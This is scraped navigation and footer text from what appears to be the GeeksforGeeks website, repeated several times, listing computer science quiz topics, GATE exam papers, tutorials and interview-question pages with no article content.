and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS 